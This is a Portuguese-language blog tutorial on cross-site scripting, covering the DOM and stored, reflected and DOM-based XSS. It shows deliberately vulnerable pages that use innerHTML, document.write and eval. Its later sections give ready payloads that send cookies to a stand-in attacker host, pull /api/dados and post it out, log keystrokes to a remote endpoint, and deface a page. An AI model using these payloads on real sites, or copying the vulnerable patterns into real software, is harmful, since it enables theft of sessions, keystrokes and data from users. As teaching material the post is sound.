---
layout: post
title: "seu xss é inútil? como abusar de xss mesmo em questões ambíguas"
date: 2024-12-12
categories: hacking xss
---

## introdução

eu sou um jovem pesquisador de segurança, atualmente com 14 anos, e decidi escrever este artigo após minha experiência em diversos ctfs e programas de bug bounty. muitas vezes, o meu xss parecia totalmente inútil, mas com certos cuidados e técnicas, consegui evoluí-lo para algo mais impactante. este artigo é para compartilhar esse aprendizado e explorar o verdadeiro potencial de um xss.

## conceito de dom e como ocorre um xss

antes de entender como explorar um xss, é importante compreender o dom (document object model). o dom é a estrutura hierárquica que representa a interface de uma página web. ele permite que o javascript e outras linguagens manipulem elementos como texto, imagens, botões e mais. vulnerabilidades de xss geralmente exploram falhas na maneira como o dom é manipulado pelo navegador ou pela aplicação.

### o que é o dom

o dom é como uma "árvore" que representa os elementos html e suas relações. cada nó na árvore é um elemento ou texto do html. aqui está um exemplo básico:

```html
<!DOCTYPE html>
<html>
<head>
  <title>exemplo</title>
</head>
<body>
  <h1>título</h1>
  <p>parágrafo de exemplo.</p>
</body>
</html>
```

essa estrutura se traduz no dom da seguinte forma:

```
- html
  - head
    - title
  - body
    - h1
    - p
```

quando um atacante explora o xss, ele injeta códigos maliciosos em um desses nós para executar ações não autorizadas.

imagem explicando o conceito de dom:
![estrutura do dom](https://upload.wikimedia.org/wikipedia/commons/5/5a/DOM-model.svg)

### como um xss ocorre

xss ocorre quando entradas do usuário são inseridas no dom sem validação ou sanitização adequadas. isso pode acontecer em diferentes cenários, como:
- exibição de comentários ou mensagens enviadas por usuários.
- parâmetros de url refletidos diretamente na página.
- manipulação insegura de elementos com javascript.

exemplo de código vulnerável:

```html
<!DOCTYPE html>
<html>
<body>
  <p id="mensagem"></p>
  <script>
    var mensagem = location.hash.substring(1);
    document.getElementById('mensagem').innerHTML = mensagem;
  </script>
</body>
</html>
```

se alguém acessar `http://site.com/#<script>alert(1)</script>`, o javascript será executado e exibirá um alerta.

imagem ilustrando como um xss pode ser processado pelo dom:
![fluxo de xss no dom](https://owasp.org/www-project-top-ten/assets/images/DOM-XSS.png)

## tipos de xss e exemplos

### stored xss

no stored xss, o código malicioso é armazenado permanentemente no servidor e entregue a outros usuários. por exemplo, um atacante pode inserir um comentário com o seguinte código:

```html
<script>fetch('https://malicioso.com?c=' + document.cookie)</script>
```

essa mensagem será salva no banco de dados e exibida para qualquer usuário que acessar a página, enviando os cookies para o servidor do atacante.

imagem de um fluxo de stored xss:
![stored xss fluxo](https://owasp.org/www-pdf-archive/Stored_XSS.png)

### reflected xss

no reflected xss, o código malicioso é "refletido" diretamente de uma solicitação para o navegador. por exemplo:

```html
<!DOCTYPE html>
<html>
<body>
  <p>bem-vindo, </p>
  <script>
    var nome = location.search.substring(1).split('=')[1];
    document.write(nome);
  </script>
</body>
</html>
```

se o usuário acessar `http://site.com/?nome=<script>alert(1)</script>`, o script será executado.

imagem ilustrando um ataque reflected xss:
![reflected xss](https://cdn2.hubspot.net/hubfs/5856033/Reflected-XSS.png)

### dom-based xss

no dom-based xss, a vulnerabilidade está na manipulação do dom pelo javascript. por exemplo:

```html
<!DOCTYPE html>
<html>
<body>
  <input id="entrada" oninput="eval(this.value)" />
</body>
</html>
```

se o atacante inserir `alert(1)` no campo de entrada, o javascript será executado diretamente no cliente.

imagem mostrando como o dom é manipulado em um ataque:
![dom-based xss](https://resources.infosecinstitute.com/wp-content/uploads/2020/02/dom-xss-example.png)

## explorando xss de forma avançada

### exfiltração de dados sensíveis

```javascript
<script>
  fetch('/api/dados')
    .then(res => res.text())
    .then(data => {
      fetch('https://malicioso.com', {
        method: 'post',
        body: data
      });
    });
</script>
```

### execução de keyloggers

```javascript
<script>
  document.addEventListener('keydown', function(e) {
    fetch('https://malicioso.com/keylogger', {
      method: 'post',
      body: e.key
    });
  });
</script>
```

### manipulação avançada do dom

```javascript
<script>
  document.body.innerHTML = '<h1>site comprometido</h1>';
</script>
```


